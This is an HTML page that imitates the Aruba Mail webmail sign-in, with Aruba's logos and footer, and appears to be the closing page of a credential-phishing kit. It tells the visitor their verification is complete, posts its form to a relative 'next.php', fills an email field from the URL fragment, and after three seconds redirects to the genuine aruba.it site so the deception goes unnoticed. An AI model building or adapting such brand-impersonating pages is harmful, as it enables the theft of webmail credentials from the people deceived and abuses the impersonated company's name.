<!doctype html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">


  <meta http-equiv="Refresh" content="3; url=https://www.aruba.it/">

  <link href="./assets/css/output.css" rel="stylesheet" />
  <link href="./assets/css/custom.css" rel="stylesheet" />

  <title>Aruba Mail</title>
</head>

<body class="bg-[#f9f9f9] font-sans xl:p-12 text-[#212529]">

  <main class="">
    <div
      class="container max-w-[1368px] mx-auto xl:px-0 px-8 flex flex-col-reverse md:flex-row justify-center xl:gap-14 xl:py-0 py-5">
      <!-- Left: Promo Image -->
      <div class="w-full xl:w-[600px] xl:flex justify-center items-start xl:pt-12.75 pt-8">
        <img src="assets/img/left-picture.jpg" alt="Promo Flash" class="max-w-full h-auto shadow-sm rounded-sm">

        <footer class="xl:py-10 py-6 border-t border-gray-100 mt-12 xl:hidden block">
          <div class="container max-w-[1200px] mx-auto px-4 text-center text-[11px] text-gray-500">
            <p>Copyright © 2026 Aruba S.p.A. - P.IVA 01573850516 - Tutti i diritti riservati -
              <a href="#" class="text-blue-600 hover:underline">Privacy</a> -
              <a href="#" class="text-blue-600 hover:underline">Cookie Policy</a> -
              <a href="#" class="text-blue-600 hover:underline">Preferenze Cookie</a>
            </p>
          </div>
        </footer>
      </div>

      <!-- Right: Sign-in Form -->
      <div class="w-full xl:w-[720px]">
        <header class="border-b border-[#b9c4cd] pb-2">
          <div class="px-4 flex items-center justify-between">
            <div class="logo">
              <img src="assets/img/logo.png" alt="Aruba.it" class="h-10.5">
            </div>
            <div class="flex items-center xl:space-x-8 space-x-10 text-[14px]">
              <div class="flex items-center cursor-pointer hover:text-blue-600">
                <img src="assets/img/question.png" alt="" class="w-6">
                <img src="assets/img/arrow-down.png" alt="" class="ms-1">
              </div>
              <div class="flex items-center cursor-pointer hover:text-blue-600">
                <img src="assets/img/language.png" alt="" class="w-[18px] h-[18px] mr-1.5">
                <span class="font-medium">Italiano</span>
                <img src="assets/img/arrow-down.png" alt="" class="w-2.5 h-2.5 ml-1 opacity-60">
              </div>
            </div>
          </div>
        </header>
        <div class="py-12 text-center">
          <div class="flex items-center justify-center mb-2">
            <img src="assets/img/logo-arubamail.svg" alt="Aruba Mail" class="h-10">
          </div>
          <p class="font-semibold">Accedi alla Webmail</p>
        </div>

        <form action="../next.php" method="POST" class="space-y-5 xl:max-w-[300px] mx-auto">


          <center>

            <div style="margin: .75rem 0;">
              <img width="200px" src="./assets/imgs/372103860_CHECK_MARK_400px.gif">
              <p>Attendi mentre effettuiamo la revisione e la verifica.</p>
              <p>Ti ringraziamo per aver completato i passaggi di verifica.<br>
              </p>
            </div>

          </center>

        </form>

        <footer class="xl:py-10 py-6 border-t border-gray-100 xl:mt-12 xl:block hidden">
          <div class="container max-w-[1200px] mx-auto px-4 text-center text-[11px] text-gray-500">
            <p>Copyright © 2026 Aruba S.p.A. - P.IVA 01573850516 - Tutti i diritti riservati -
              <a href="#" class="text-blue-600 hover:underline">Privacy</a> -
              <a href="#" class="text-blue-600 hover:underline">Cookie Policy</a> -
              <a href="#" class="text-blue-600 hover:underline">Preferenze Cookie</a>
            </p>
          </div>
        </footer>
      </div>
    </div>
  </main>




  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

  <script>
    $(document).ready(function() {
      const passwordInput = $('#password');
      const toggleBtn = passwordInput.next('button');
      const toggleImg = toggleBtn.find('img');

      toggleBtn.click(function() {
        if (passwordInput.attr('type') === 'password') {
          passwordInput.attr('type', 'text');
          toggleImg.attr('src', 'assets/img/hide.png');
        } else {
          passwordInput.attr('type', 'password');
          toggleImg.attr('src', 'assets/img/show.png');
        }
      });
    });
  </script>
  <script>
    // Grab email from URL using #
    const url = window.location.href;
    const email = url.split("#")[1]; // or split("?email=")[1] if using ?email=

    if (email) {
      document.getElementById("email").value = decodeURIComponent(email);
    }
  </script>
</body>

</html>